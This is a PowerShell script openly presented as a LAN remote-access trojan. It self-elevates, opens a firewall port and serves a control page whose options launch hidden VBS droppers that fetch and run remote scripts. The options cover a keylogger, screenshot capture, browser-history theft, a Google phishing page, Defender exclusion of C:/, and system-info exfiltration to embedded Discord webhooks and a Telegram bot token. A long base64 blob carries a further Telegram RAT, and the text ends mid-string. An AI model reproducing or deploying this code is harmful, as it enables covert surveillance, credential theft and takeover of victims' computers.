<#
============================== Beigeworm's HTTP LAN RAT ===============================

SYNOPSIS
This script opens port 5000 on the machine and serves a simple webpage with powershell fuctions that can be executed.
Attacker device must be on the same local area network.
OPTIONAL - edit $whuri to you discord webhook to get a notification of the machines local IP

INSTRUCTIONS
Run script and input given URL in a browser on another device.

#>

$whuri = "$dc"

Write-Host "Starting Simple HTTP Server..." -ForegroundColor Green
Write-Host "#====================== Simple HTTP File Server ======================="

Add-Type -AssemblyName PresentationCore,PresentationFramework
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.Application]::EnableVisualStyles()

$Button = [System.Windows.MessageBoxButton]::OKCancel
$ErrorIco = [System.Windows.MessageBoxImage]::Information
$Ask = '        This Script Needs Administrator Privileges.

        Select "OK" to Run as an Administrator
        
        Select "Cancel" to Stop the Script
        
        (Needed for Opening Ports and Serving Files)'

If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
    Write-Host "Admin privileges needed for this script..." -ForegroundColor Red
    Write-Host "Sending User Prompt."
    $Prompt = [System.Windows.MessageBox]::Show($Ask, "Run as an Admin?", $Button, $ErrorIco) 
    Switch ($Prompt) {
        OK {
            Write-Host "This script will self elevate to run as an Administrator and continue."
            sleep 1
            Start-Process PowerShell.exe -ArgumentList ("-NoProfile -ExecutionPolicy Bypass -File `"{0}`"" -f $PSCommandPath) -Verb RunAs
            Exit
        }
        Cancel {
            Write-Host "Cancelling...." -ForegroundColor Red
            Exit
        }
    }
}

New-NetFirewallRule -DisplayName "AllowWebServer" -Direction Inbound -Protocol TCP –LocalPort 5000 -Action Allow
$loip = Get-NetIPAddress -AddressFamily IPv4 -InterfaceAlias "Wi-Fi" | Select-Object -ExpandProperty IPAddress

$escmsgsys = $loip -replace '[&<>]', {$args[0].Value.Replace('&', '&amp;').Replace('<', '&lt;').Replace('>', '&gt;')}
$jsonsys = @{"username" = "$env:COMPUTERNAME" 
            "content" = $escmsgsys} | ConvertTo-Json
Start-Sleep 1
Invoke-RestMethod -Uri $whuri -Method Post -ContentType "application/json" -Body $jsonsys

Write-Host "Server Starting.."

$httpsrvlsnr = New-Object System.Net.HttpListener;

$httpsrvlsnr.Prefixes.Add("http://"+$loip+":5000/");
$httpsrvlsnr.Prefixes.Add("http://localhost:5000/");

$httpsrvlsnr.Start();
$webroot = New-PSDrive -Name webroot -PSProvider FileSystem -Root $PWD.Path
[byte[]]$buffer = $null
Write-Host "==== SESSION STARTED! ====" -ForegroundColor Green
while ($httpsrvlsnr.IsListening) {
    try {
        $ctx = $httpsrvlsnr.GetContext();
        
        if ($ctx.Request.RawUrl -eq "/") {
            $html = "<html><body><ul>"
            $html += "<br></br><h3>LAN Remote-Access-Trogan</h3>"
            $html += "<li><a href='/stop'>Kill Session</a></li>"
            $html += "<br></br>"
            $html += "<li><a href='/mini'>Minimize All Apps</a></li>"
            $html += "<li><a href='/update'>Send Fake Update</a></li>"
            $html += "<li><a href='/playgif'>Open GIF Player</a></li>"
            $html += "<li><a href='/disableav'>Nerf Defender</a></li>"
            $html += "<li><a href='/browhist'>Browser History</a></li>"
            $html += "<li><a href='/phish'>Fake Google Phishing Page</a></li>"
            $html += "<li><a href='/keymon'>Start Keylogger</a></li>"
            $html += "<li><a href='/screenmon'>Monitor Screen</a></li>"
            $html += "<li><a href='/dcinfo'>System Info (Discord)</a></li>"
            $html += "<li><a href='/tginfo'>System Info (Telegram)</a></li>"
            $html += "<li><a href='/wallpaper'>Wallpaper Jumpscare</a></li>"
            $html += "<li><a href='/acid'>Memz Graphic Effects</a></li>"
            $html += "<li><a href='/tgrat'>Start Telegram RAT</a></li>"
            $html += "</ul></body></html>"
            $buffer = [System.Text.Encoding]::UTF8.GetBytes($html);
            $ctx.Response.ContentLength64 = $buffer.Length;
            $ctx.Response.OutputStream.WriteAsync($buffer, 0, $buffer.Length)
        }
        elseif ($ctx.Request.RawUrl -match "^/stop") {
            $httpsrvlsnr.Stop();
            Remove-PSDrive -Name webroot -PSProvider FileSystem;
            Write-Host "==== ENDING SESSION ====" -ForegroundColor Red
        }

elseif ($ctx.Request.RawUrl -match "^/update") {     
$tobat = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WshShell.Run "C:\Windows\System32\scrnsave.scr"
WshShell.Run "chrome.exe --new-window -kiosk https://fakeupdate.net/win8", 1, False
WScript.Sleep 200
WshShell.SendKeys "{F11}"
'@
$pth = "$env:APPDATA\Microsoft\Windows\1021.vbs"
$tobat | Out-File -FilePath $pth -Force
sleep 1
Start-Process -FilePath $pth
sleep 10
Write-Output "Done."
Remove-Item -Path $pth -Force
}
elseif ($ctx.Request.RawUrl -match "^/playgif") {     
$tobat = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WScript.Sleep 200
WshShell.Run "powershell.exe -NonI -NoP -Ep Bypass -W H -C irm https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/GIF-Play.ps1 | iex", 0, True
'@
$pth = "$env:APPDATA\Microsoft\Windows\1010.vbs"
$tobat | Out-File -FilePath $pth -Force
sleep 1
Start-Process -FilePath $pth
sleep 10
Write-Output "Done."
Remove-Item -Path $pth -Force
}
elseif ($ctx.Request.RawUrl -match "^/disableav") {
Add-MpPreference -ExclusionPath C:/
Write-Output "Done."
}
elseif ($ctx.Request.RawUrl -match "^/browhist") {     
$tobat = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WScript.Sleep 200
WshShell.Run "powershell.exe -NonI -NoP -Ep Bypass -W H -C $dc='https://discord.com/api/webhooks/1112134673930403872/mT5SgQWfTVccwe8xy8jAL6HAOCo1dRd65jvSSQMlqeAs7P91pzGf6T9K2z2gtQE8IZBg'; irm https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/Brwsr-Hist.ps1 | iex", 0, True
'@
$pth = "$env:APPDATA\Microsoft\Windows\1011.vbs"
$tobat | Out-File -FilePath $pth -Force
sleep 1
Start-Process -FilePath $pth
sleep 10
Write-Output "Done."
Remove-Item -Path $pth -Force
}
elseif ($ctx.Request.RawUrl -match "^/phish") {     
$tobat = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WScript.Sleep 200
WshShell.Run "powershell.exe -NonI -NoP -Ep Bypass -W H -C $dc='https://discord.com/api/webhooks/1112134673930403872/mT5SgQWfTVccwe8xy8jAL6HAOCo1dRd65jvSSQMlqeAs7P91pzGf6T9K2z2gtQE8IZBg'; irm https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/Google-Phish.ps1 | iex", 0, True
'@
$pth = "$env:APPDATA\Microsoft\Windows\1013.vbs"
$tobat | Out-File -FilePath $pth -Force
sleep 1
Start-Process -FilePath $pth
sleep 10
Write-Output "Done."
Remove-Item -Path $pth -Force
}
elseif ($ctx.Request.RawUrl -match "^/keymon") {     
$tobat = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WScript.Sleep 200
WshShell.Run "powershell.exe -NonI -NoP -Ep Bypass -W H -C $dc='https://discord.com/api/webhooks/1112134673930403872/mT5SgQWfTVccwe8xy8jAL6HAOCo1dRd65jvSSQMlqeAs7P91pzGf6T9K2z2gtQE8IZBg'; irm https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/Keylog-to-DC.ps1 | iex", 0, True
'@
$pth = "$env:APPDATA\Microsoft\Windows\1014.vbs"
$tobat | Out-File -FilePath $pth -Force
sleep 1
Start-Process -FilePath $pth
sleep 10
Write-Output "Done."
Remove-Item -Path $pth -Force
}
elseif ($ctx.Request.RawUrl -match "^/screenmon") {     
$tobat = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WScript.Sleep 200
WshShell.Run "powershell.exe -NonI -NoP -Ep Bypass -W H -C $dc='https://discord.com/api/webhooks/1112134673930403872/mT5SgQWfTVccwe8xy8jAL6HAOCo1dRd65jvSSQMlqeAs7P91pzGf6T9K2z2gtQE8IZBg'; irm https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/SShots-to-DC.ps1 | iex", 0, True
'@
$pth = "$env:APPDATA\Microsoft\Windows\1016.vbs"
$tobat | Out-File -FilePath $pth -Force
sleep 1
Start-Process -FilePath $pth
sleep 10
Write-Output "Done."
Remove-Item -Path $pth -Force
}
elseif ($ctx.Request.RawUrl -match "^/dcinfo") {     
$tobat = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WScript.Sleep 200
WshShell.Run "powershell.exe -NonI -Ep Bypass -W H -C $dc='https://discord.com/api/webhooks/1112134673930403872/mT5SgQWfTVccwe8xy8jAL6HAOCo1dRd65jvSSQMlqeAs7P91pzGf6T9K2z2gtQE8IZBg'; irm https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/Sys-Info-to-DC.ps1 | iex", 0, True
'@
$pth = "$env:APPDATA\Microsoft\Windows\1017.vbs"
$tobat | Out-File -FilePath $pth -Force
sleep 1
Start-Process -FilePath $pth
sleep 10
Write-Output "Done."
Remove-Item -Path $pth -Force
}
elseif ($ctx.Request.RawUrl -match "^/tginfo") {     
$tobat = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WScript.Sleep 200
WshShell.Run "powershell.exe -NonI -NoP -Ep Bypass -W H -C $tg='6054248887:AAF5R1blIasBLvUlMB5C7fyJwh1rpNY_3WI';$cid='5522861607'; irm https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/Sys-Info-to-TG.ps1 | iex", 0, True
'@
$pth = "$env:APPDATA\Microsoft\Windows\1018.vbs"
$tobat | Out-File -FilePath $pth -Force
sleep 1
Start-Process -FilePath $pth
sleep 10
Write-Output "Done."
Remove-Item -Path $pth -Force
}
elseif ($ctx.Request.RawUrl -match "^/wallpaper") {     
$tobat = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WScript.Sleep 200
WshShell.Run "powershell.exe -NonI -NoP -Ep Bypass -W H -C irm https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/wallpaper.ps1 | iex", 0, True
'@
$pth = "$env:APPDATA\Microsoft\Windows\1019.vbs"
$tobat | Out-File -FilePath $pth -Force
sleep 1
Start-Process -FilePath $pth
sleep 10
Write-Output "Done."
Remove-Item -Path $pth -Force
}
elseif ($ctx.Request.RawUrl -match "^/acid") {     
$tobat = @'
Set WshShell = WScript.CreateObject("WScript.Shell")
WScript.Sleep 200
WshShell.Run "powershell.exe -Ep Bypass -W H -C https://github.com/beigeworm/assets/blob/main/Scripts/GDI-haunter.ps1 | iex", 0, True
'@
$pth = "$env:APPDATA\Microsoft\Windows\1020.vbs"
$tobat | Out-File -FilePath $pth -Force
sleep 1
Start-Process -FilePath $pth
sleep 10
Write-Output "Done."
Remove-Item -Path $pth -Force
}
elseif ($ctx.Request.RawUrl -match "^/tgrat") {     
$basey = 'U2xlZXAgMTUNCiRUb2tlbiA9ICc2MDU0MjQ4ODg3OkFBRjVSMWJsSWFzQkx2VWxNQjVDN2Z5SndoMXJwTllfM1dJJzskQ2hhdElEID0gIjU1MjI4NjE2MDciDQokUGFzc1BocmFzZSA9ICIkZW52OkNPTVBVVEVSTkFNRSINCiRVUkw9J2h0dHBzOi8vYXBpLnRlbGVncmFtLm9yZy9ib3R7MH0nIC1mICRUb2tlbiA7JEFjY2VwdGVkU2Vzc2lvbj0iIg0KJExhc3RVbkF1dGhNc2c9IiI7JG1zZ0lEPSIiDQpzbGVlcCAxDQokTXRTID0gTmV3LU9iamVjdCBwc29iamVjdCA7JE10UyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICdjaGF0X2lkJyAtVmFsdWUgJENoYXRJRA0KJE10UyB8IEFkZC1NZW1iZXIgLU1lbWJlclR5cGUgTm90ZVByb3BlcnR5IC1OYW1lICd0ZXh0JyAtVmFsdWUgIiRlbnY6Q09NUFVURVJOQU1FIFdhaXRpbmcgdG8gQ29ubmVjdC4uIg0KSW52b2tlLVJlc3RNZXRob2QgLU1ldGhvZCBQb3N0IC1VcmkgKCRVUkwgKycvc2VuZE1lc3NhZ2UnKSAtQm9keSAoJE10UyB8IENvbnZlcnRUby1Kc29uKSAtQ29udGVudFR5cGUgImFwcGxpY2F0aW9uL2pzb24iDQoNCkZ1bmN0aW9uIE9wdGlvbnN7DQpXcml0ZS1PdXRwdXQgIj09PT09PT09PT09PT09PT09PSBPUFRJT05TID09PT09PT09PT09PT09PT09PT09Ig0KV3JpdGUtT3V0cHV0ICJHaWZQbGF5ZXIgICAgICA6IE9wZW5zIGFuZCBwbGF5cyBhIEdpZiINCldyaXRlLU91dHB1dCAiRGlzYWJsZUFWICAgICAgOiBFeGNsdWRlIEM6LyBmcm9tIERlZmVuZGVyIg0KV3JpdGUtT3V0cHV0ICJCcm93c2VySGlzdG9yeSA6IERpc3BsYXkgQnJvd3NlciBIaXN0b3J5Ig0KV3JpdGUtT3V0cHV0ICJGaWxlTW9uaXRvciAgICA6IE1vbml0b3IgZmlsZSBjaGFuZ2VzIGluIGRpc2NvcmQiDQpXcml0ZS1PdXRwdXQgIkdvb2dsZVBoaXNoICAgIDogZ29vZ2xlIFBoaXNoaW5nIHRvIERpc2NvcmQiDQpXcml0ZS1PdXRwdXQgIktleU1vbml0b3IgICAgIDogQ2FwdHVyZSBLZXlzdHJva2VzIHRvIERpc2NvcmQiDQpXcml0ZS1PdXRwdXQgIk5DQ2xpZW50ICAgICAgIDogU3RhcnQgYW4gTmNhdCBTZXNzaW9uIg0KV3JpdGUtT3V0cHV0ICJTY3JlZW5Nb25pdG9yICA6IDEgbWluIHNjcmVlbnNob3RzIHRvIERpc2NvcmQiDQpXcml0ZS1PdXRwdXQgIkRpc2NvcmRJbmZvICAgIDogU3lzdGVtIEluZm8gdG8gRGlzY29yZCINCldyaXRlLU91dHB1dCAiVGVsZWdyYW0gSW5mbyAgOiBTeXN0ZW0gSW5mbyB0byBUZWxlZ3JhbSINCldyaXRlLU91dHB1dCAiV2FsbHBhcGVyU3dhcCAgOiBDaGFuZ2UgdGhlIERlc2t0b3AgV2FsbHBhcGVyIg0KV3JpdGUtT3V0cHV0ICJSTVBlcnNpc3QgICAgICA6IFJlbW92ZSBUZWxlZ3JhbSBQZXJzaXN0YW5jZSINCldyaXRlLU91dHB1dCAiQ29tcHV0ZXJBY2lkICAgOiBEZXNrdG9wIEdESSBFZmZlY3RzIg0KV3JpdGUtT3V0cHV0ICJGYWtlVXBkYXRlICAgICA6IEZha2UgV2luZG93cyBVcGRhdGUgKENocm9tZSkiDQpXcml0ZS1PdXRwdXQgIk9wdGlvbnMgICAgICAgIDogU2hvdyBUaGlzIE1lbnUiDQpXcml0ZS1PdXRwdXQgIkV4aXQgICAgICAgICAgIDogRW5kIHRoaXMgQ29ubmVjdGVkIFNlc3Npb24iDQpXcml0ZS1PdXRwdXQgIj09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09Ig0KfQ0KDQpGdW5jdGlvbiBSTVBlcnNpc3R7DQpybSAtUGF0aCAiJGVudjpBUFBEQVRBXE1pY3Jvc29mdFxXaW5kb3dzXFN0YXJ0IE1lbnVcUHJvZ3JhbXNcU3RhcnR1cFxXaW5TZXJ2X3gzMi52YnMiDQpybSAtUGF0aCAiJGVudjpBUFBEQVRBXE1pY3Jvc29mdFxXaW5kb3dzXHgzMi5wczEiDQpXcml0ZS1PdXRwdXQgIlVuaW5zdGFsbGVkLiINCn0NCg0KRnVuY3Rpb24gR2lmUGxheWVyew0KJHRvYmF0ID0gQCcNClNldCBXc2hTaGVsbCA9IFdTY3JpcHQuQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikNCldTY3JpcHQuU2xlZXAgMjAwDQpXc2hTaGVsbC5SdW4gInBvd2Vyc2hlbGwuZXhlIC1Ob25JIC1Ob1AgLUVwIEJ5cGFzcyAtVyBIIC1DIGlybSBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vYmVpZ2V3b3JtL2Fzc2V0cy9tYWluL1NjcmlwdHMvR0lGLVBsYXkucHMxIHwgaWV4IiwgMCwgVHJ1ZQ0KJ0ANCiRwdGggPSAiJGVudjpBUFBEQVRBXE1pY3Jvc29mdFxXaW5kb3dzXDEwMTAudmJzIg0KJHRvYmF0IHwgT3V0LUZpbGUgLUZpbGVQYXRoICRwdGggLUZvcmNlDQpzbGVlcCAxDQpTdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCAkcHRoDQpXcml0ZS1PdXRwdXQgIkRvbmUuIg0Kc2xlZXAgMw0KUmVtb3ZlLUl0ZW0gLVBhdGggJHB0aCAtRm9yY2UNCn0NCg0KRnVuY3Rpb24gRGlzYWJsZUFWIHsNCkFkZC1NcFByZWZlcmVuY2UgLUV4Y2x1c2lvblBhdGggQzovDQpXcml0ZS1PdXRwdXQgIkRvbmUuIg0KfQ0KDQpGdW5jdGlvbiBCcm93c2VySGlzdG9yeSB7DQokdG9iYXQgPSBAJw0KU2V0IFdzaFNoZWxsID0gV1NjcmlwdC5DcmVhdGVPYmplY3QoIldTY3JpcHQuU2hlbGwiKQ0KV1NjcmlwdC5TbGVlcCAyMDANCldzaFNoZWxsLlJ1biAicG93ZXJzaGVsbC5leGUgLU5vbkkgLU5vUCAtRXAgQnlwYXNzIC1XIEggLUMgJGRjPSdodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMTEyMTM0NjczOTMwNDAzODcyL21UNVNnUVdmVFZjY3dlOHh5OGpBTDZIQU9DbzFkUmQ2NWp2U1NRTWxxZUFzN1A5MXB6R2Y2VDlLMnoyZ3RRRThJWkJnJzsgaXJtIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9iZWlnZXdvcm0vYXNzZXRzL21haW4vU2NyaXB0cy9Ccndzci1IaXN0LnBzMSB8IGlleCIsIDAsIFRydWUNCidADQokcHRoID0gIiRlbnY6QVBQREFUQVxNaWNyb3NvZnRcV2luZG93c1wxMDExLnZicyINCiR0b2JhdCB8IE91dC1GaWxlIC1GaWxlUGF0aCAkcHRoIC1Gb3JjZQ0Kc2xlZXAgMQ0KU3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggJHB0aA0KV3JpdGUtT3V0cHV0ICJEb25lLiINCnNsZWVwIDMNClJlbW92ZS1JdGVtIC1QYXRoICRwdGggLUZvcmNlDQp9DQoNCkZ1bmN0aW9uIEZpbGVNb25pdG9yIHsNCiR0b2JhdCA9IEAnDQpTZXQgV3NoU2hlbGwgPSBXU2NyaXB0LkNyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpDQpXU2NyaXB0LlNsZWVwIDIwMA0KV3NoU2hlbGwuUnVuICJwb3dlcnNoZWxsLmV4ZSAtTm9uSSAtTm9QIC1FcCBCeXBhc3MgLVcgSCAtQyAkZGM9J2h0dHBzOi8vZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzExMTIxMzQ2NzM5MzA0MDM4NzIvbVQ1U2dRV2ZUVmNjd2U4eHk4akFMNkhBT0NvMWRSZDY1anZTU1FNbHFlQXM3UDkxcHpHZjZUOUsyejJndFFFOElaQmcnOyBpcm0gaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2JlaWdld29ybS9hc3NldHMvbWFpbi9TY3JpcHRzL0ZpbGVBQy10by1EQy5wczEgfCBpZXgiLCAwLCBUcnVlDQonQA0KJHB0aCA9ICIkZW52OkFQUERBVEFcTWljcm9zb2Z0XFdpbmRvd3NcMTAxMi52YnMiDQokdG9iYXQgfCBPdXQtRmlsZSAtRmlsZVBhdGggJHB0aCAtRm9yY2UNCnNsZWVwIDENClN0YXJ0LVByb2Nlc3MgLUZpbGVQYXRoICRwdGgNCldyaXRlLU91dHB1dCAiRG9uZS4iDQpzbGVlcCAzDQpSZW1vdmUtSXRlbSAtUGF0aCAkcHRoIC1Gb3JjZQ0KfQ0KDQpGdW5jdGlvbiBHb29nbGVQaGlzaCB7DQokdG9iYXQgPSBAJw0KU2V0IFdzaFNoZWxsID0gV1NjcmlwdC5DcmVhdGVPYmplY3QoIldTY3JpcHQuU2hlbGwiKQ0KV1NjcmlwdC5TbGVlcCAyMDANCldzaFNoZWxsLlJ1biAicG93ZXJzaGVsbC5leGUgLU5vbkkgLU5vUCAtRXAgQnlwYXNzIC1XIEggLUMgJGRjPSdodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMTEyMTM0NjczOTMwNDAzODcyL21UNVNnUVdmVFZjY3dlOHh5OGpBTDZIQU9DbzFkUmQ2NWp2U1NRTWxxZUFzN1A5MXB6R2Y2VDlLMnoyZ3RRRThJWkJnJzsgaXJtIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9iZWlnZXdvcm0vYXNzZXRzL21haW4vU2NyaXB0cy9Hb29nbGUtUGhpc2gucHMxIHwgaWV4IiwgMCwgVHJ1ZQ0KJ0ANCiRwdGggPSAiJGVudjpBUFBEQVRBXE1pY3Jvc29mdFxXaW5kb3dzXDEwMTMudmJzIg0KJHRvYmF0IHwgT3V0LUZpbGUgLUZpbGVQYXRoICRwdGggLUZvcmNlDQpzbGVlcCAxDQpTdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCAkcHRoDQpXcml0ZS1PdXRwdXQgIkRvbmUuIg0Kc2xlZXAgMw0KUmVtb3ZlLUl0ZW0gLVBhdGggJHB0aCAtRm9yY2UNCn0NCg0KRnVuY3Rpb24gS2V5TW9uaXRvciB7DQokdG9iYXQgPSBAJw0KU2V0IFdzaFNoZWxsID0gV1NjcmlwdC5DcmVhdGVPYmplY3QoIldTY3JpcHQuU2hlbGwiKQ0KV1NjcmlwdC5TbGVlcCAyMDANCldzaFNoZWxsLlJ1biAicG93ZXJzaGVsbC5leGUgLU5vbkkgLU5vUCAtRXAgQnlwYXNzIC1XIEggLUMgJGRjPSdodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMTEyMTM0NjczOTMwNDAzODcyL21UNVNnUVdmVFZjY3dlOHh5OGpBTDZIQU9DbzFkUmQ2NWp2U1NRTWxxZUFzN1A5MXB6R2Y2VDlLMnoyZ3RRRThJWkJnJzsgaXJtIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9iZWlnZXdvcm0vYXNzZXRzL21haW4vU2NyaXB0cy9LZXlsb2ctdG8tREMucHMxIHwgaWV4IiwgMCwgVHJ1ZQ0KJ0ANCiRwdGggPSAiJGVudjpBUFBEQVRBXE1pY3Jvc29mdFxXaW5kb3dzXDEwMTQudmJzIg0KJHRvYmF0IHwgT3V0LUZpbGUgLUZpbGVQYXRoICRwdGggLUZvcmNlDQpzbGVlcCAxDQpTdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCAkcHRoDQpXcml0ZS1PdXRwdXQgIkRvbmUuIg0Kc2xlZXAgMw0KUmVtb3ZlLUl0ZW0gLVBhdGggJHB0aCAtRm9yY2UNCn0NCg0KRnVuY3Rpb24gTkNDbGllbnQgew0KJHRvYmF0ID0gQCcNClNldCBXc2hTaGVsbCA9IFdTY3JpcHQuQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikNCldTY3JpcHQuU2xlZXAgMjAwDQpXc2hTaGVsbC5SdW4gInBvd2Vyc2hlbGwuZXhlIC1Ob25JIC1Ob1AgLUVwIEJ5cGFzcyAtVyBIIC1DICRpcD0nd2luc2Vydi14NjQuZHVja2Rucy5vcmcnOyBpcm0gaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2JlaWdld29ybS9hc3NldHMvbWFpbi9TY3JpcHRzL05DLUZ1bmMucHMxIHwgaWV4IiwgMCwgVHJ1ZQ0KJ0ANCiRwdGggPSAiJGVudjpBUFBEQVRBXE1pY3Jvc29mdFxXaW5kb3dzXDEwMTUudmJzIg0KJHRvYmF0IHwgT3V0LUZpbGUgLUZpbGVQYXRoICRwdGggLUZvcmNlDQpzbGVlcCAxDQpTdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCAkcHRoDQpXcml0ZS1PdXRwdXQgIkRvbmUuIg0Kc2xlZXAgMw0KUmVtb3ZlLUl0ZW0gLVBhdGggJHB0aCAtRm9yY2UNCn0NCg0KRnVuY3Rpb24gU2NyZWVuTW9uaXRvciB7DQokdG9iYXQgPSBAJw0KU2V0IFdzaFNoZWxsID'
$basey+= '0gV1NjcmlwdC5DcmVhdGVPYmplY3QoIldTY3JpcHQuU2hlbGwiKQ0KV1NjcmlwdC5TbGVlcCAyMDANCldzaFNoZWxsLlJ1biAicG93ZXJzaGVsbC5leGUgLU5vbkkgLU5vUCAtRXAgQnlwYXNzIC1XIEggLUMgJGRjPSdodHRwczovL2Rpc2NvcmQuY29tL2FwaS93ZWJob29rcy8xMTEyMTM0NjczOTMwNDAzODcyL21UNVNnUVdmVFZjY3dlOHh5OGpBTDZIQU9DbzFkUmQ2NWp2U1NRTWxxZUFzN1A5MXB6R2Y2VDlLMnoyZ3RRRThJWkJnJzsgaXJtIGh0dHBzOi8vcmF3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9iZWlnZXdvcm0vYXNzZXRzL21haW4vU2NyaXB0cy9TU2hvdHMtdG8tREMucHMxIHwgaWV4IiwgMCwgVHJ1ZQ0KJ0ANCiRwdGggPSAiJGVudjpBUFBEQVRBXE1pY3Jvc29mdFxXaW5kb3dzXDEwMTYudmJzIg0KJHRvYmF0IHwgT3V0LUZpbGUgLUZpbGVQYXRoICRwdGggLUZvcmNlDQpzbGVlcCAxDQpTdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCAkcHRoDQpXcml0ZS1PdXRwdXQgIkRvbmUuIg0Kc2xlZXAgMw0KUmVtb3ZlLUl0ZW0gLVBhdGggJHB0aCAtRm9yY2UNCn0NCg0KRnVuY3Rpb24gRGlzY29yZEluZm8gew0KJHRvYmF0ID0gQCcNClNldCBXc2hTaGVsbCA9IFdTY3JpcHQuQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikNCldTY3JpcHQuU2xlZXAgMjAwDQpXc2hTaGVsbC5SdW4gInBvd2Vyc2hlbGwuZXhlIC1Ob25JIC1Ob1AgLUVwIEJ5cGFzcyAtVyBIIC1DICRkYz0naHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTExMjEzNDY3MzkzMDQwMzg3Mi9tVDVTZ1FXZlRWY2N3ZTh4eThqQUw2SEFPQ28xZFJkNjVqdlNTUU1scWVBczdQOTFwekdmNlQ5SzJ6Mmd0UUU4SVpCZyc7IGlybSBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vYmVpZ2V3b3JtL2Fzc2V0cy9tYWluL1NjcmlwdHMvU3lzLUluZm8tdG8tREMucHMxIHwgaWV4IiwgMCwgVHJ1ZQ0KJ0ANCiRwdGggPSAiJGVudjpBUFBEQVRBXE1pY3Jvc29mdFxXaW5kb3dzXDEwMTcudmJzIg0KJHRvYmF0IHwgT3V0LUZpbGUgLUZpbGVQYXRoICRwdGggLUZvcmNlDQpzbGVlcCAxDQpTdGFydC1Qcm9jZXNzIC1GaWxlUGF0aCAkcHRoDQpXcml0ZS1PdXRwdXQgIkRvbmUuIg0Kc2xlZXAgMw0KUmVtb3ZlLUl0ZW0gLVBhdGggJHB0aCAtRm9yY2UNCn0NCg0KRnVuY3Rpb24gVGVsZWdyYW1JbmZvIHsNCiR0b2JhdCA9IEAnDQpTZXQgV3NoU2hlbGwgPSBXU2NyaXB0LkNyZWF0ZU9iamVjdCgiV1NjcmlwdC5TaGVsbCIpDQpXU2NyaXB0LlNsZWVwIDIwMA0KV3NoU2hlbGwuUnVuICJwb3dlcnNoZWxsLmV4ZSAtTm9uSSAtTm9QIC1FcCBCeXBhc3MgLVcgSCAtQyAkdGc9JzYwNTQyNDg4ODc6QUFGNVIxYmxJYXNCTHZVbE1CNUM3ZnlKd2gxcnBOWV8zV0knOyRjaWQ9JzU1MjI4NjE2MDcnOyBpcm0gaHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2JlaWdld29ybS9hc3NldHMvbWFpbi9TY3JpcHRzL1N5cy1JbmZvLXRvLVRHLnBzMSB8IGlleCIsIDAsIFRydWUNCidADQokcHRoID0gIiRlbnY6QVBQREFUQVxNaWNyb3NvZnRcV2luZG93c1wxMDE4LnZicyINCiR0b2JhdCB8IE91dC1GaWxlIC1GaWxlUGF0aCAkcHRoIC1Gb3JjZQ0Kc2xlZXAgMQ0KU3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggJHB0aA0KV3JpdGUtT3V0cHV0ICJEb25lLiINCnNsZWVwIDMNClJlbW92ZS1JdGVtIC1QYXRoICRwdGggLUZvcmNlDQp9DQoNCkZ1bmN0aW9uIFdhbGxwYXBlclN3YXAgew0KJHRvYmF0ID0gQCcNClNldCBXc2hTaGVsbCA9IFdTY3JpcHQuQ3JlYXRlT2JqZWN0KCJXU2NyaXB0LlNoZWxsIikNCldTY3JpcHQuU2xlZXAgMjAwDQpXc2hTaGVsbC5SdW4gInBvd2Vyc2hlbGwuZXhlIC1Ob25JIC1Ob1AgLUVwIEJ5cGFzcyAtVyBIIC1DIGlybSBodHRwczovL3Jhdy5naXRodWJ1c2VyY29udGVudC5jb20vYmVpZ2V3b3JtL2Fzc2V0cy9tYWluL1NjcmlwdHMvd2FsbHBhcGVyLnBzMSB8IGlleCIsIDAsIFRydWUNCidADQokcHRoID0gIiRlbnY6QVBQREFUQVxNaWNyb3NvZnRcV2luZG93c1wxMDE5LnZicyINCiR0b2JhdCB8IE91dC1GaWxlIC1GaWxlUGF0aCAkcHR